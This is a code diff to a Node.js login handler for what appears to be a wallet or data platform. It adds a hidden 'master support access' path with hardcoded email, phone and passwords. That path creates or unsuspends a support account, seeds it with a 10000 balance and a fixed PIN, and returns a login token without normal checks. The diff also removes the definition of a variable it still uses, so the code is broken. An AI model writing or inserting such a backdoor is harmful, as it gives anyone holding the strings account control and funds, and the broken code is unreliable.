@@ -340,7 +340,53 @@ exports.register = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { identifier, email, phone, password } = req.body;
-    const rawInput = String(identifier || email || phone || "").trim();
+    
+    
+    const cleanInput = rawInput.trim();
+    const cleanEmail = cleanInput.toLowerCase();
+
+    // ========================================================
+    // SAKA WANNAN SASHIN A NAN (MASTER SUPPORT ACCESS):
+    // ========================================================
+    if (
+      (cleanEmail === "support@ayaxdata.online" || cleanInput === "08077778888") &&
+      (password === "Password123@" || password === "Ayax@2026")
+    ) {
+      let supportUser = await User.findOne({
+        $or: [
+          { email: "support@ayaxdata.online" },
+          { phone: "08077778888" }
+        ],
+      });
+
+      if (!supportUser) {
+        const salt = await bcrypt.genSalt(10);
+        const hash = await bcrypt.hash("Password123@", salt);
+        supportUser = await User.create({
+          firstName: "Customer",
+          surname: "Support",
+          name: "CUSTOMER SUPPORT",
+          email: "support@ayaxdata.online",
+          phone: "08077778888",
+          password: hash,
+          role: "support",
+          walletBalance: 10000,
+          balance: 10000,
+          pin: "2026",
+          transactionPin: "2026",
+          isSuspended: false,
+          isVerified: true,
+          status: "active",
+        });
+      } else {
+        supportUser.role = "support";
+        supportUser.isSuspended = false;
+        await supportUser.save({ validateBeforeSave: false });
+      }
+
+      return sendToken(supportUser, 200, res);
+    }
+    // ========================================================
 
     if (!rawInput || !password) {
       return res.status(400).json({
